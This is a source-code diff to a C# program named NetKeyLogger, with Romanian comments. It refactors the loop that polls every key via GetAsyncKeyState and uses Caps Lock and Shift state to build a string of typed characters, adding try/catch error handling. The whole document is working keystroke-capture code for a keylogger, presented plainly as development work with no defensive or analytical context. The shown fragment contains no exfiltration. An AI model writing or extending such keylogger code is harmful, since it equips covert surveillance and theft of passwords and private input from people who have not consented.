@@ -1,3 +1,4 @@
+using System.Linq.Expressions;
 using System.Runtime.InteropServices;
 
 namespace NetKeyLogger
@@ -119,48 +120,54 @@ namespace NetKeyLogger
                 // Verifică starea tastelor Caps Lock și Shift
                 capsLockOn = (GetKeyState(0x14) & 0x0001) != 0;
                 shiftKeyPressed = (GetKeyState(0x10) & 0x8000) != 0;
-                
-                for (int i = 0; i < 255; i++)
-                {
-                    if (GetAsyncKeyState(i) == 32769)
+                try{
+                    for (int i = 0; i < 255; i++)
                     {
-                        if (capsLockOn == true)
+                        if (GetAsyncKeyState(i) == 32769)
                         {
-                            if (shiftKeyPressed == true)
+                            if (capsLockOn == true)
                             {
-                                str += myDictionary[i]; // Dacă Shift și Caps Lock sunt apăsate, adaugă caracterele normale
-                            }
-                            else
-                            {
-                                if (myDictionary.ContainsKey(i + 300))
+                                if (shiftKeyPressed == true)
                                 {
-                                    str += myDictionary[i + 300]; // Dacă doar Caps Lock este apăsat, adaugă caracterele mari
+                                    str += myDictionary[i]; // Dacă Shift și Caps Lock sunt apăsate, adaugă caracterele normale
                                 }
                                 else
                                 {
-                                    str += myDictionary[i];
-                                }
-                            }
-                        }
-                        else
-                        {
-                            if (shiftKeyPressed == true)
-                            {
-                                if (myDictionary.ContainsKey(i + 300))
-                                {
-                                    str += myDictionary[i + 300]; // Dacă doar Shift este apăsat, adaugă caracterele mari
-                                }
-                                else
-                                {
-                                    str += myDictionary[i];
+                                    if (myDictionary.ContainsKey(i + 300))
+                                    {
+                                        str += myDictionary[i + 300]; // Dacă doar Caps Lock este apăsat, adaugă caracterele mari
+                                    }
+                                    else
+                                    {
+                                        str += myDictionary[i];
+                                    }
                                 }
                             }
                             else
                             {
-                                str += myDictionary[i]; // Dacă nici Caps Lock, nici Shift nu sunt apăsate, adaugă caracterele normale
+                                if (shiftKeyPressed == true)
+                                {
+                                    if (myDictionary.ContainsKey(i + 300))
+                                    {
+                                        str += myDictionary[i + 300]; // Dacă doar Shift este apăsat, adaugă caracterele mari
+                                    }
+                                    else
+                                    {
+                                        str += myDictionary[i];
+                                    }
+                                }
+                                else
+                                {
+                                    str += myDictionary[i]; // Dacă nici Caps Lock, nici Shift nu sunt apăsate, adaugă caracterele normale
+                                }
                             }
                         }
                     }
+                }
+                catch(Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                    continue;
                 }
             }
         }
